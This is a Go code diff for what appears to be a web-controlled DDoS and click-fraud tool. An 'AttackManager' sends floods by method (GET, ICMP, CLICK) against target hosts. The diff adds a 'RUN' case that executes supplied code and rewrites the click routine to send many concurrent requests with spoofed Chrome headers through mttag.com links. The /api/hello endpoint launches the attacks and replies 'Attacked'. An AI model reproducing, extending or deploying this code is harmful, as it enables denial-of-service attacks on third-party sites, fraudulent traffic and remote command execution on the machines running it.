@@ -1,4 +1,4 @@
-package handler
+package main
 
 import (
 	crypto_rand "crypto/rand"
@@ -111,9 +111,8 @@ type AttackManager struct {
 	Managers map[string]*Attack
 }
 
-func Role(Attack AttackManager) string {
+func Role(Attack AttackManager) {
 	var wg sync.WaitGroup
-	var s string
 	for _, value := range Attack.Managers {
 		switch value.Method {
 		case "GET":
@@ -137,13 +136,15 @@ func Role(Attack AttackManager) string {
 		case "ICMP":
 			wg.Add(1)
 			go ICMP(value.Host, value.B.Code, value.Thread, &wg)
+		case "RUN":
+			wg.Add(1)
+			RUN(value.B.Code)
 		case "CLICK":
 			wg.Add(1)
-			s = AF(value.Host, value.Thread, &wg)
+			go AF(value.Host, value.Thread, &wg)
 		}
 	}
 	wg.Wait()
-	return s
 }
 
 func RUN(Code string) {
@@ -378,34 +379,38 @@ func CF_POST(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGrou
 	wg.Wait()
 }
 
-func AF(Host string, Thread int, wgs *sync.WaitGroup) string {
-	s, err := click(Host)
-	if err != nil {
-		fmt.Println(err)
-		return err.Error()
+func AF(Host string, Thread int, wgs *sync.WaitGroup) {
+	defer wgs.Done()
+	var wg sync.WaitGroup
+	for i := 0; i <= Thread; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			s := click(Host)
+			client := &http.Client{}
+			req, err := http.NewRequest("GET", s, nil)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+			req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+			req.Header.Set("accept-language", "ja,en-US;q=0.9,en;q=0.8")
+			req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
+			req.Header.Set("sec-ch-ua-mobile", "?0")
+			req.Header.Set("sec-ch-ua-platform", `"Windows"`)
+			req.Header.Set("sec-fetch-dest", "document")
+			req.Header.Set("sec-fetch-mode", "navigate")
+			req.Header.Set("sec-fetch-site", "none")
+			req.Header.Set("sec-fetch-user", "?1")
+			req.Header.Set("upgrade-insecure-requests", "1")
+			req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
+			client.Do(req)
+		}()
 	}
-	client := &http.Client{}
-	req, err := http.NewRequest("GET", s, nil)
-	if err != nil {
-		fmt.Println(err)
-		return err.Error()
-	}
-	req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
-	req.Header.Set("accept-language", "ja,en-US;q=0.9,en;q=0.8")
-	req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
-	req.Header.Set("sec-ch-ua-mobile", "?0")
-	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
-	req.Header.Set("sec-fetch-dest", "document")
-	req.Header.Set("sec-fetch-mode", "navigate")
-	req.Header.Set("sec-fetch-site", "none")
-	req.Header.Set("sec-fetch-user", "?1")
-	req.Header.Set("upgrade-insecure-requests", "1")
-	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
-	client.Do(req)
-	return "成功"
+	wg.Wait()
 }
 
-func click(URL string) (string, error) {
+func click(URL string) string {
 	jar := tls_client.NewCookieJar()
 	options := []tls_client.HttpClientOption{
 		tls_client.WithTimeoutSeconds(30),
@@ -417,12 +422,12 @@ func click(URL string) (string, error) {
 	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
 	if err != nil {
 		fmt.Println(err)
-		return "", err
+		return ""
 	}
 	req, err := httpf.NewRequest("GET", "https://mttag.com/s/"+URL, nil)
 	if err != nil {
 		fmt.Println(err)
-		return "", err
+		return ""
 	}
 	req.Header.Set("authority", "mttag.com")
 	req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
@@ -439,7 +444,7 @@ func click(URL string) (string, error) {
 	resp, err := client.Do(req)
 	if err != nil {
 		fmt.Println(err)
-		return "", err
+		return ""
 	}
 	var b string
 	for value, r := range resp.Header {
@@ -451,7 +456,7 @@ func click(URL string) (string, error) {
 	req, err = httpf.NewRequest("GET", "https://mttag.com/cc/"+URL, nil)
 	if err != nil {
 		fmt.Println(err)
-		return "", err
+		return ""
 	}
 	req.Header.Set("authority", "mttag.com")
 	req.Header.Set("accept-language", "ja,en-US;q=0.9,en;q=0.8")
@@ -468,7 +473,7 @@ func click(URL string) (string, error) {
 	resp, err = client.Do(req)
 	if err != nil {
 		fmt.Println(err)
-		return "", err
+		return ""
 	}
 	var bs string
 	for value, r := range resp.Header {
@@ -477,7 +482,7 @@ func click(URL string) (string, error) {
 			bs = r[0]
 		}
 	}
-	return bs, nil
+	return bs
 }
 
 func Hello(c echo.Context) error {
@@ -498,16 +503,16 @@ func Hello(c echo.Context) error {
 		return c.String(http.StatusOK, "Hello World")
 	}
 
-	s := Role(Attacks)
-	return c.String(http.StatusOK, s)
+	Role(Attacks)
+	return c.String(http.StatusOK, "Attacked")
 }
 
-func Handler(w http.ResponseWriter, r *http.Request) {
+func main() {
 	//go Rule()
 	e := echo.New()
 	e.Use(middleware.Logger())
 	e.Use(middleware.Recover())
 	e.GET("/api/hello", Hello)
 
-	e.ServeHTTP(w, r)
+	e.Start(":8080")
 }
